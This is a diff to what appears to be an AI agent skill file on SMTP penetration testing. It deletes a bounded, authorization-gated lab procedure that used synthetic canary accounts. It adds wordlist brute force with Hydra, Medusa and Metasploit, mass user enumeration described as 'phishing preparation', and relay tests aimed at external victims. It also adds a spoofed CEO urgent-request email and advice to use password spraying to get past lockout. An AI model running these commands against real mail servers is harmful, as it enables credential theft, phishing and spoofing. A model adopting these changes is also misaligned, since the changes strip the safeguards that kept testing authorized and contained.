@@ -1,6 +1,6 @@
 ---
 name: smtp-penetration-testing
-description: "Validate SMTP security controls in authorized lab environments using synthetic accounts, bounded requests, and controlled mail sinks."
+description: "Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration."
 risk: offensive
 source: community
 author: zebbern
@@ -13,20 +13,7 @@ date_added: "2026-02-27"
 
 ## Purpose
 
-Validate SMTP service exposure, recipient-enumeration resistance, relay policy, authentication controls, TLS, and domain authentication in an explicitly authorized lab. Use only synthetic accounts and owner-controlled mail sinks; do not harvest users, brute-force credentials, spoof people, deliver phishing content, or relay mail to third parties.
-
-## Mandatory Test Gate
-
-Record all of the following before connecting:
-
-- written authorization for exact SMTP hosts, ports, source IPs, synthetic accounts, sink domains, and time window;
-- an owner-controlled sink that cannot forward externally;
-- a request cap and rate (default: 50 SMTP commands total, at most 1 command/second, one connection);
-- maximum authentication failures below the documented lockout threshold (default: 3 against one synthetic account);
-- allowed impact limited to test messages containing `SMTP_SECURITY_TEST` and no attachments, links, personal data, or real sender identities;
-- stop conditions: delivery outside the sink, unexpected real recipient response, lockout, queue growth, service degradation, or any out-of-scope hostname.
-
-If any prerequisite is absent, stop after passive configuration review.
+Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration. This skill covers banner grabbing, user enumeration techniques, relay testing, brute force attacks, and security hardening recommendations.
 
 ## Prerequisites
 
@@ -38,7 +25,14 @@ sudo apt-get install nmap
 # Netcat
 sudo apt-get install netcat
 
-# Use only owner-approved tools already installed in the isolated lab
+# Hydra for brute force
+sudo apt-get install hydra
+
+# SMTP user enumeration tool
+sudo apt-get install smtp-user-enum
+
+# Metasploit Framework
+msfconsole
 ```
 
 ### Required Knowledge
@@ -50,13 +44,13 @@ sudo apt-get install netcat
 ### Required Access
 - Target SMTP server IP/hostname
 - Written authorization for testing
-- Two synthetic recipient addresses (one valid, one invalid) and one synthetic auth account
+- Wordlists for enumeration and brute force
 
 ## Outputs and Deliverables
 
 1. **SMTP Security Assessment Report** - Comprehensive vulnerability findings
-2. **Enumeration-Resistance Results** - Differential behavior for synthetic canaries
-3. **Relay Test Results** - Controlled sink acceptance status
+2. **User Enumeration Results** - Valid email addresses discovered
+3. **Relay Test Results** - Open relay status and exploitation potential
 4. **Remediation Recommendations** - Security hardening guidance
 
 ## Core Workflow
@@ -131,8 +125,8 @@ Test available SMTP commands:
 # Connect and test commands
 nc TARGET_IP 25
 
-# Initial greeting from the authorized test identity
-EHLO tester.example.test
+# Initial greeting
+EHLO attacker.com
 
 # Response shows capabilities:
 250-mail.target.com
@@ -149,22 +143,59 @@ EHLO tester.example.test
 Key commands to test:
 
 ```bash
-# VRFY - compare only owner-created synthetic canaries
-VRFY valid-canary
-VRFY invalid-canary
+# VRFY - Verify user exists
+VRFY admin
+250 2.1.5 admin@target.com
 
 # EXPN - Expand mailing list
-EXPN synthetic-empty-list
+EXPN staff
+250 2.1.5 user1@target.com
+250 2.1.5 user2@target.com
 
 # RCPT TO - Recipient verification
-MAIL FROM:<tester@sender.example.test>
-RCPT TO:<valid-canary@sink.example.test>
-# Compare with the invalid synthetic canary; do not probe real names.
+MAIL FROM:<test@attacker.com>
+RCPT TO:<admin@target.com>
+# 250 OK = user exists
+# 550 = user doesn't exist
 ```
 
 ### Phase 5: User Enumeration
 
-Compare exactly one valid and one invalid owner-created canary through the same command path. Record status code, normalized response length, and coarse latency. Do not use wordlists, employee names, aliases, address harvesting tools, or automated enumeration modules. A distinguishable response is sufficient evidence; stop after the first repeatable difference.
+Enumerate valid email addresses:
+
+```bash
+# Using smtp-user-enum with VRFY
+smtp-user-enum -M VRFY -U /usr/share/wordlists/users.txt -t TARGET_IP
+
+# Using EXPN method
+smtp-user-enum -M EXPN -U /usr/share/wordlists/users.txt -t TARGET_IP
+
+# Using RCPT method
+smtp-user-enum -M RCPT -U /usr/share/wordlists/users.txt -t TARGET_IP
+
+# Specify port and domain
+smtp-user-enum -M VRFY -U users.txt -t TARGET_IP -p 25 -d target.com
+```
+
+Using Metasploit:
+
+```bash
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS TARGET_IP
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+set UNIXONLY true
+run
+```
+
+Using Nmap:
+
+```bash
+# SMTP user enumeration script
+nmap --script smtp-enum-users -p 25 TARGET_IP
+
+# With custom user list
+nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p 25 TARGET_IP
+```
 
 ### Phase 6: Open Relay Testing
 
@@ -174,41 +205,105 @@ Test for unauthorized email relay:
 # Using Nmap
 nmap -p 25 --script smtp-open-relay TARGET_IP
 
-# Manual testing against the non-forwarding sink
+# Manual testing via Telnet
 telnet TARGET_IP 25
-HELO tester.example.test
-MAIL FROM:<tester@sender.example.test>
-RCPT TO:<relay-canary@sink.example.test>
+HELO attacker.com
+MAIL FROM:<test@attacker.com>
+RCPT TO:<victim@external-domain.com>
 DATA
-Subject: SMTP_SECURITY_TEST
-SMTP_SECURITY_TEST synthetic relay marker.
+Subject: Relay Test
+This is a test.
 .
 QUIT
 
-# Acceptance is evidence only if the owner confirms the sink represents an unauthenticated relay path.
+# If accepted (250 OK), server is open relay
 ```
 
-### Phase 7: Authentication-Control Validation
+Using Metasploit:
 
-Use one owner-created synthetic account. Submit at most the pre-approved number of known-invalid passwords, no faster than the gate rate, then verify with the owner that throttling, alerting, and lockout behaved as designed. Never use password lists, spraying, credential stuffing, or real accounts. Stop immediately on lockout or unexpected authentication success.
+```bash
+use auxiliary/scanner/smtp/smtp_relay
+set RHOSTS TARGET_IP
+run
+```
+
+Test variations:
+
+```bash
+# Test different sender/recipient combinations
+MAIL FROM:<>
+MAIL FROM:<test@[attacker_IP]>
+MAIL FROM:<test@target.com>
+
+RCPT TO:<test@external.com>
+RCPT TO:<"test@external.com">
+RCPT TO:<test%external.com@target.com>
+```
+
+### Phase 7: Brute Force Authentication
+
+Test for weak SMTP credentials:
+
+```bash
+# Using Hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://TARGET_IP
+
+# With specific port and SSL
+hydra -l admin -P passwords.txt -s 465 -S TARGET_IP smtp
+
+# Multiple users
+hydra -L users.txt -P passwords.txt TARGET_IP smtp
+
+# Verbose output
+hydra -l admin -P passwords.txt smtp://TARGET_IP -V
+```
+
+Using Medusa:
+
+```bash
+medusa -h TARGET_IP -u admin -P /path/to/passwords.txt -M smtp
+```
+
+Using Metasploit:
+
+```bash
+use auxiliary/scanner/smtp/smtp_login
+set RHOSTS TARGET_IP
+set USER_FILE /path/to/users.txt
+set PASS_FILE /path/to/passwords.txt
+set VERBOSE true
+run
+```
 
 ### Phase 8: SMTP Command Injection
 
 Test for command injection vulnerabilities:
 
 ```bash
-# Header-handling test in the controlled sink
-MAIL FROM:<tester@sender.example.test>
-RCPT TO:<header-canary@sink.example.test>
+# Header injection test
+MAIL FROM:<attacker@test.com>
+RCPT TO:<victim@target.com>
 DATA
-Subject: SMTP_SECURITY_TEST
-X-Security-Test: SMTP_SECURITY_TEST
+Subject: Test
+Bcc: hidden@attacker.com
+X-Injected: malicious-header
 
-Synthetic marker only
+Injected content
 .
 ```
 
-Do not impersonate executives, employees, or trusted brands. Validate SPF/DKIM/DMARC alignment with owner-created test domains and inspect authentication results at the sink.
+Email spoofing test:
+
+```bash
+# Spoofed sender (tests SPF/DKIM protection)
+MAIL FROM:<ceo@target.com>
+RCPT TO:<employee@target.com>
+DATA
+From: CEO <ceo@target.com>
+Subject: Urgent Request
+Please process this request immediately.
+.
+```
 
 ### Phase 9: TLS/SSL Security Testing
 
@@ -270,8 +365,10 @@ dig TXT _dmarc.target.com                 # DMARC
 
 | Tool | Command |
 |------|---------|
-| Manual canary pair | Compare one valid and one invalid synthetic recipient |
-| Netcat | Connect once and issue the approved canary commands |
+| smtp-user-enum | `smtp-user-enum -M VRFY -U users.txt -t IP` |
+| Nmap | `nmap --script smtp-enum-users -p 25 IP` |
+| Metasploit | `use auxiliary/scanner/smtp/smtp_enum` |
+| Netcat | `nc IP 25` then manual commands |
 
 ### Common Vulnerabilities
 
@@ -280,7 +377,7 @@ dig TXT _dmarc.target.com                 # DMARC
 | Open Relay | High | Relay test with external recipient |
 | User Enumeration | Medium | VRFY/EXPN/RCPT commands |
 | Banner Disclosure | Low | Banner grabbing |
-| Weak Auth Controls | High | Bounded failures on one synthetic account |
+| Weak Auth | High | Brute force attack |
 | No TLS | Medium | STARTTLS test |
 | Missing SPF/DKIM | Medium | DNS record lookup |
 
@@ -319,12 +416,14 @@ nc mail.target.com 25
 EHLO test.com
 QUIT
 
-# Step 3: compare the two synthetic canaries manually
+# Step 3: User enumeration
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t mail.target.com
 
 # Step 4: Open relay test
 nmap -p 25 --script smtp-open-relay mail.target.com
 
-# Step 5: submit only the pre-approved invalid attempts for the synthetic account
+# Step 5: Authentication test
+hydra -l admin -P /usr/share/wordlists/fasttrack.txt smtp://mail.target.com
 
 # Step 6: TLS check
 openssl s_client -connect mail.target.com:25 -starttls smtp
@@ -334,9 +433,29 @@ dig TXT target.com | grep spf
 dig TXT _dmarc.target.com
 ```
 
-### Example 2: Recipient-Enumeration Resistance
+### Example 2: User Enumeration Attack
 
-**Scenario:** Compare `valid-canary@sink.example.test` and `invalid-canary@sink.example.test` once each. If response codes or text differ consistently, report the disclosure and stop. Do not expand the sample.
+**Scenario:** Enumerate valid users for phishing preparation
+
+```bash
+# Method 1: VRFY
+smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100 -p 25
+
+# Method 2: RCPT with timing analysis
+smtp-user-enum -M RCPT -U users.txt -t 192.168.1.100 -p 25 -d target.com
+
+# Method 3: Metasploit
+msfconsole
+use auxiliary/scanner/smtp/smtp_enum
+set RHOSTS 192.168.1.100
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+run
+
+# Results show valid users
+[+] 192.168.1.100:25 - Found user: admin
+[+] 192.168.1.100:25 - Found user: root
+[+] 192.168.1.100:25 - Found user: postmaster
+```
 
 ### Example 3: Open Relay Exploitation
 
@@ -345,13 +464,13 @@ dig TXT _dmarc.target.com
 ```bash
 # Test via Telnet
 telnet mail.target.com 25
-HELO tester.example.test
-MAIL FROM:<tester@sender.example.test>
-RCPT TO:<relay-canary@sink.example.test>
-# Have the owner verify that the sink accepted the synthetic marker.
+HELO attacker.com
+MAIL FROM:<test@attacker.com>
+RCPT TO:<test@gmail.com>
+# If 250 OK - VULNERABLE
 
 # Document with Nmap
-nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=tester@sender.example.test,smtp-open-relay.to=relay-canary@sink.example.test mail.target.com
+nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com
 
 # Output:
 # PORT   STATE SERVICE
@@ -364,8 +483,8 @@ nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=tester@se
 | Issue | Cause | Solution |
 |-------|-------|----------|
 | Connection Refused | Port blocked or closed | Check port with nmap; ISP may block port 25; try 587/465; use VPN |
-| VRFY/EXPN Disabled | Server hardened | Record the control; do not seek an alternate enumeration path |
-| Auth Test Blocked | Rate limiting/lockout | Stop and record the control; do not spray or bypass it |
+| VRFY/EXPN Disabled | Server hardened | Use RCPT TO method; analyze response time/code variations |
+| Brute Force Blocked | Rate limiting/lockout | Slow down (`hydra -W 5`); use password spraying; check for fail2ban |
 | SSL/TLS Errors | Wrong port or protocol | Use 465 for SSL, 25/587 for STARTTLS; verify EHLO response |
 
 ## Security Recommendations
@@ -376,7 +495,7 @@ nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=tester@se
 2. **Disable VRFY/EXPN** - Prevent user enumeration
 3. **Enforce TLS** - Require STARTTLS for all connections
 4. **Implement SPF/DKIM/DMARC** - Prevent email spoofing
-5. **Rate Limiting** - Bound repeated authentication failures
+5. **Rate Limiting** - Prevent brute force attacks
 6. **Account Lockout** - Lock accounts after failed attempts
 7. **Banner Hardening** - Minimize server information disclosure
 8. **Log Monitoring** - Alert on suspicious activity
